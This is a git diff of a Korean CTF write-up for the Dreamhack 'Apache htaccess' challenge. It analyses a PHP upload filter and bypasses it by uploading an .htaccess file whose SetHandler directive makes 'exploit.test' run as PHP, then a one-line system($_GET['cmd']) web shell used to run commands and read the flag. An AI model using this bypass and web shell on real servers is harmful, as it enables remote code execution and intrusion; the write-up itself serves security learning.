@@ -1,10 +1,14 @@
 # [Dreamhack Wargame] Apache htaccess
-### [🚩Apache htaccess](https://dreamhack.io/wargame/challenges/418/)
+* 출처: 🚩 Apache htaccess [🔗](https://dreamhack.io/wargame/challenges/418/)
+* Reference: File Vulnerabliity - File Upload Vulnerability
+    - ❗️참고: File Vulnerability for Windows: Apache Web Server: 알반 권한으로 임의 코드를 실행하는 방법 [🔗](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Web%20Hacking/File%20Vulnerabilities%20for%20Windows.md#apache-web-server-일반-권한으로-임의-코드를-실행하는-방법)
+* 문제 설명
+  <br/><br/>
   <img width="1071" alt="Apache htaccess_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/811de14b-5ae5-49e4-b5e7-e9be87b01860">
 
 <br/><br/>
 
-## 문제 파일(upload.php) 분석
+## 문제 파일(upload.php) 및 취약점 분석
 ```php
 <?php
 $deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml"); // 필터링할 확장자 리스트
@@ -46,46 +50,46 @@ if (isset($_FILES)) {
         ```
         + 배열의 내부 포인터를 마지막 요소로 이동하고 해당 값을 반환함
         + 참고: 📚 [PHP: end - Manual](https://www.php.net/manual/en/function.end)
+* php, php3, php4 등의 확장자를 필터링하고 있지만, 기본값인 .htaccess 파일을 사용해 설정 파일을 관리하고 있음
+    - ⚠️ .htaccess 파일은 웹 서버의 권한만 있다면 덮어쓸 수 있음 <br/> &nbsp;&nbsp; → ***.php 확장자 외의 다른 확장자를 PHP 스크립트로 해석하도록 설정을 변경함*** (= 확장자 우회)
+        + ```<Files>``` 섹션을 이용한 확장자 우회 (.htaccess 파일에 작성해야 하는 내용)
+            ```Apache
+            <Files "exploit.test">
+              # Apache2 자체 mod_php를 사용함
+              SetHandler application/x-httpd-php
+            </Files>
+            ```
+            - 위치와 관계없이 "exploit.test"이란 이름을 가진 파일에 대한 요청이 들어오면 ```SetHandler```에 명시된 핸들러가 처리함
 
 <br/><br/>
 
-## 문제 풀이
-### 취약점이 존재하는 부분
-php, php3, php4 등의 확장자를 필터링하고 있지만 .htaccess 파일을 사용해 설정 파일을 관리하고 있으므로 이를 이용해 ```.php``` 확장자 외의 다른 확장자를 PHP 스크립트로 해석하도록 만들어 확장자 우회를 통해 웹 셸을 실행시킬 수 있음
-
-<br/><br/>
-
-### 익스플로잇
-1. 아래의 내용이 들어간 .htaccess 파일을 만들고 이를 업로드함
+## 문제 풀이 (익스플로잇)
+1. 취약점 분석에서 작성한 .htaccess 파일을 생성하고 업로드함
+   <br/><br/>
    <img width="2560" alt="exploit1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/717f3198-852c-406b-9172-7e3a57267145">
 
-    - ```.htaccess``` 파일 내용
-      ```Apache
-      <Files "exploit.test">
-          SetHandler application/x-httpd-php
-      </Files>
-      ```
-    - exploit.test라는 이름을 가진 파일에 대한 요청이 들어오면 ```SetHandler```에 의해 명시된 핸들러가 실행되므로 PHP 스크립트로 해석하여 이를 실행함
-
 <br/>
 
-2. 아래와 같이 exploit.test 파일을 만들고 이 웹 셸을 업로드함
+2. .htaccess 파일에 의해서 exploit.test는 PHP 스크립트로 해석되므로 아래와 같이 exploit.test를 생성하고 이 웹 셸을 업로드하면 해당 파일의 경로가 **/upload/exploit.test**임을 알 수 있음
+   <br/><br/>
    <img width="2560" alt="exploit2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/069d3c14-2fa5-4350-992c-687f54a98ab7">
-
-    ```php
-    // exploit.test
-    <?php
-        system($_GET['cmd']);
-    ?>
-    ```
-    + 업로드된 웹 셸 파일은 ```/upload/exploit.test```에 존재함
+   <br/>
+   
+   - exploit.test 파일 내용
+       ```php
+       <?php
+         system($_GET['cmd']);
+       ?>
+       ```
 
 <br/>
 
-3. ```upload/exploit.test```의 cmd 파라미터 값으로 플래그를 획득하기 위한 명령어를 입력함
+3. **/upload/exploit.test**로 접속하여 cmd 파라미터의 값으로 플래그를 획득하기 위한 명령어를 입력함
+   <br/><br/>
    <img width="2560" alt="exploit3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/08d05a62-81c5-41bf-b00e-b319c7a883fa">
+   <br/>
 
-    - ```cmd``` 파라미터의 값으로 ```ls -al /```을 입력한 후 요청을 보내 플래그 파일의 위치를 찾음
+    1. ```cmd``` 파라미터의 값으로 ```ls -al /```을 입력한 후 요청을 보내 플래그 파일의 위치를 찾음
         +  ```/flag```에 플래그 파일이 존재하며, 실행 권한만 존재하기 때문에 플래그 파일을 실행해야 플래그를 획득할 수 있음을 알 수 있음
-    - 플래그 파일의 실행을 위해 ```cmd``` 파라미터의 값으로 ```/flag```를 입력한 후 요청을 보내면 플래그 파일이 실행되어 플래그를 획득할 수 있음
+    2. 플래그 파일의 실행을 위해 ```cmd``` 파라미터의 값으로 ```/flag```를 입력한 후 요청을 보내면 플래그 파일이 실행되어 플래그를 획득할 수 있음
 
